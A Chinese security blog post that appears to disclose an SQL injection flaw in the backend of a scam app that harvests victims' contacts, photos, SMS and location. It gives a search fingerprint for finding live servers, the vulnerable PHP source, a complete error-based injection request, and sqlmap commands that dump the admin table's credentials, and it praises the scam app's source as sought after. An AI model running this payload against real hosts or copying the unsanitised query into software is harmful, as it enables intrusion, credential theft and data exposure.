#  某新版诈骗双端APP通讯录存在前台SQL注入漏洞  
原创 Mstir  星悦安全   2025-07-12 06:19  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**2025 获取双端txl通讯录、相册、短信、定位、已安装APP信息，代码无加密，搭建简单，安卓端是原生纯源码，iOS端是uniapp纯源码，也是有价值的，很多人都在找能用的.**  
  
**Fofa指纹 : "由Thinkphp5提供高性能框架开发而生！"**  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREk6pMgmCibhxuVWsibfnrDdybRGkCcWszWmGHMgOOTBAf2f8S5viaKibPBA/640?wx_fmt=other&from=appmsg "")  
  
看见这后台就懂了，某些ZP的用的  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREd8El63icYY7Xx7nK3n3xGv87YTsEaia3xYJSqOUJt3Zd3trLLpvnx9hw/640?wx_fmt=other&from=appmsg "")  
  
框架:ThinkPHP 5.0.24 Debug:true  
##   
## 0x01 漏洞分析&复现  
  
**位于 /api.php 中，通过GET传入ID参数，直接进入SQL查询字句，且未加过滤，导致漏洞产生，其中需POST传入img参数，实际上传的文件后缀被写死.**  
  
****  
```
<?phpheader('Access-Control-Allow-Origin:*');header('Content-Type:text/plain;charset=utf-8');require('conn.php');    function imgbc($image)    {        $imageName = "25220_".date("His",time())."_".rand(1111,9999).'.png';        if (strstr($image,",")){          $image = explode(',',$image);        $image = $image[1];        }        $path = "./uploads/".date("Ymd",time());        if (!is_dir($path)){ //判断目录是否存在 不存在就创建          mkdir($path,0777,true);        }        $imageSrc= $path."/". $imageName; //图片名字        $r = file_put_contents($imageSrc, base64_decode($image));//返回的是字节数        return"/uploads/".date("Ymd",time())."/". $imageName;    }    if(isset($_POST['img'])){        $img = imgbc('data:image/jpg;base64,'.$_POST['img']);        $userid = $_GET['id'];        $sqlUser = "select * from app_user where name = '$userid'";    $resultUser = mysqli_query($conn,$sqlUser);    if ($resultUser->num_rows > 0) {        $row = $resultUser->fetch_assoc();        $user_id = $row['id'];                $sql = "INSERT INTO app_xiangce VALUES (null, '".$user_id."',null,'".$img."', '".time()."')";             if ($conn->query($sql) == TRUE) {            echo"成功";        } else {            echo"Error: " . $sql . "<br>" . $conn->error;        }    }else{         echo"Error: " . $sql . "<br>" . $conn->error;    }}
```  
  
  
**Payload（爆库）:**  
  
```
POST /api.php?id='+AND+EXTRACTVALUE(6165,CONCAT(0x5c,(SELECT+(USER()))))--+KrBJ HTTP/1.1Host: 192.168.140.128Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 5img=1
```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5cGNmvfrEicd34KiaNEhz7XREEiaXtZNLcCaNFlZRrTU2cgf1VZ7GLeITwWGfgAbrQmmeiadQibLfjDaGQ/640?wx_fmt=other&from=appmsg "")  
  
**Python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
****  
****  
****  
**-T app_admin -C name,password --dump   爆出管理员表的账密**  
## 0x02 关注公众号  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，交易所**  
  
**关注公众号，获取最新安全文章!**  
  
****  
  
****  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
